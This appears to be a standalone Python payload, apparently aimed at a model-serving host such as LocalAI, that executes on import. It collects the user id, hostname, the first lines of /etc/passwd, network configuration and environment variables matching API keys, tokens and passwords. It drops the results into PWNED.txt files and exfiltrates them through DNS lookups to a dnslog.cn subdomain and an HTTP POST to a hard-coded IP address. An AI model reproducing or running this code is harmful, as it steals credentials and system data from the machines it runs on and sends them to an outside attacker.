import os, subprocess, base64, socket, sys
def _run():
    try:
        r = subprocess.check_output("id; hostname; uname -a; echo ===PASSWD===; head -10 /etc/passwd 2>/dev/null; echo ===ENV===; env | grep -iE 'api.?key|token|secret|sk-|deepseek|openai|azure|password|auth|localai|mysql|postgres|redis' | head -40; echo ===NET===; cat /etc/hosts 2>/dev/null | head -10; ip a 2>/dev/null | head -20", shell=True, stderr=subprocess.STDOUT, timeout=25)
    except Exception as e:
        r = str(e).encode()
    b64 = base64.b64encode(r).decode()
    # 写文件 (多重路径)
    for p in ["/models/PWNED.txt", "/tmp/PWNED.txt", "/build/models/PWNED.txt"]:
        try:
            open(p, "wb").write(r)
        except: pass
    # DNS 外带: 每段 30 字符查询 <seg>.hc92gc.dnslog.cn
    DNS = "hc92gc.dnslog.cn"
    for i in range(0, len(b64), 30):
        seg = b64[i:i+30]
        label = seg.replace("+", "p").replace("/", "s").replace("=", "e")
        try:
            socket.gethostbyname(label + "." + DNS)
        except: pass
        try:
            subprocess.check_output("nslookup " + label + "." + DNS, shell=True, timeout=5, stderr=subprocess.STDOUT)
        except: pass
    # 也尝试 HTTP 回连到本机(如果可达)
    try:
        import urllib.request as u
        req = u.Request("http://203.160.68.160:18080/exfil", data=b64.encode(), headers={"Content-Type":"text/plain"}, method="POST")
        u.urlopen(req, timeout=8)
    except: pass
_run()
